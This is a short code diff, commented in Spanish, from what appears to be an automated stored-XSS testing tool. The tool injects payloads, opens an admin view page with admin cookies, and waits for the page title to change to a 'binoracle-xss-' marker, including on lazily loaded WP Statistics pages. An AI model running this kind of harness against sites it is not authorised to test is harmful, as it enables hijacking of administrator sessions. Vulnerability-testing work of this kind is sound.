+                            params=params_inject if m == "GET" else None,
+                            headers=_inject_headers if _inject_headers else None)
                     except Exception as e:
                         tried.append({"payload": payload_value, "paso1_error": str(e)})
                         continue
                     # PASO 2: admin abre la pagina de vista -- si el payload se renderiza ahi
-                    # y ejecuta JS, document.title cambia al marcador
+                    # y ejecuta JS, document.title cambia al marcador.
+                    # wait_for_xss_title: espera activamente hasta que el titulo cambie a
+                    # algo que empiece por 'binoracle-xss-' (cubre AJAX-lazy views como
+                    # WP Statistics overview que carga los datos post-load-event).
                     title, _ = xb.render(boot.base_url, stored_xss_view_path,
-                                         "GET", {}, admin_cookies)
+                                         "GET", {}, admin_cookies,
+                                         wait_for_xss_title="binoracle-xss-")
                     tried.append({"payload": payload_value, "title_tras_vista_admin": title})
                     if title == marker:
                         found = True
